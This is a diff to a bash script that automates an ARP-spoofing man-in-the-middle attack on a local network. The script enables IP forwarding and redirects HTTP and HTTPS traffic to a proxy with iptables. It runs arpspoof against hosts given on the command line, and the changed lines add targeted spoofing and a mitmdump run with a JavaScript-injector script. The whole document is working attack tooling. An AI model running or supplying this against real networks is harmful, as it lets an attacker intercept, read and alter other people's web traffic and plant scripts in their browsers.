@@ -2,14 +2,18 @@
 WIFI_INTERFACE=$(iw dev | grep "Interface" | sed -r "s/\s+Interface\s+(\W)*/\1/")
 NIC=$WIFI_INTERFACE
 GATEWAY=$(ip route | grep "default via" |  cut -d " " -f 3)
-echo Using interface $NIC
+SUBNET=$(echo $GATEWAY | grep -o -P '(\d+\.){3}')
+TARGETS=$(for t in $@; do echo -n "$SUBNET$t "; done)
 echo [*] Enabling IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo [*] Adding redirect iptables rule
 iptables -t nat -F
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
-echo [*] Starting arp spoofing
-urxvt -e bash -c "arpspoof -i $NIC $GATEWAY" &
-urxvt -e bash -c "mitmproxy -T --host" &
+echo [*] Starting arp spoofing on $NIC through $GATEWAY
+echo [*] Targetting $TARGETS
+RANGE=$(for i in $TARGETS; do echo -n "-t $i "; done)
+urxvt -e bash -c "arpspoof -i $NIC -r $RANGE $GATEWAY" &
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+urxvt -e bash -c "mitmdump -T --anticache --host -s $DIR/aspoof-scripts/js_injector.py" &
 wait
